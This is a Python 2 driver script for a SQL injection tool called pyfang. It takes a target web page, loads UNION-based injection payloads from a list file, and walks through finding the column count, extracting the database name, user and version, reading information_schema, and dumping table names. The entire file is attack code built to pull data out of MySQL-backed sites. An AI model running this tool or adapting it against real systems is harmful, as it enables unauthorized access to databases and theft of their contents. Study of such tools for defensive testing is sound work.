#!/usr/bin/python
""" Driver program for pyfang. Handles user-defined options and calls appropriate modules.

    OPTIONS to support:
        -f:     \n-delimited text file of parameters to inject (default is mysql_params).
        -d:     Delimiter to use. Default is '/**/', also can use:
                                             '%20' 
        -db:    Database to try injections against (default is MySQL). Only MySQL supported as of now.
        -v:     Verbose mode.
"""

import os, sys, urllib2
import builder, injector, scanner, parser, reporter
import json

if __name__ == '__main__':

    if len(sys.argv) == 1:
        print 'Help?'
        sys.exit(0)

    page = sys.argv[1]

    # whitespace-delimited file
    mysql_params = open('./lists/mysql/basic_union.txt').read().split()

    # Classes
    build = builder.Builder(page, mysql_params)
    fang = injector.Injector("")
    report = reporter.Reporter()
    parse = parser.Parser()

    """ 0) Find vuln. param
        1) union select to get num cols
        3) Get DB, user, version, etc
        4) get table list, print interesting table names
        5) select int. tables, get col # and names
        6) grab selected col. info
    """

    # Get column data
    print '\n### Basic Page Structure ###'
    num_columns = fang.get_num_columns(page) 
    report.columns_in_statement(num_columns)
    magic_num = int(fang.get_visible_param(page))
    print 'Magic Param','\t', magic_num

    # Get data
    print '\n### Basic DB Info ###'
    data = fang.injection(page, build.union(num_columns, magic_num)) 
    report.db_info(parse.db_values(data))
    data = fang.injection(page, build.schema_union(num_columns, magic_num)) 
    print parse.information_schema(data)

    # Get data
    print '\n### DB Table Info ###'
    print fang.injection(page, build.tables(num_columns, magic_num)) 


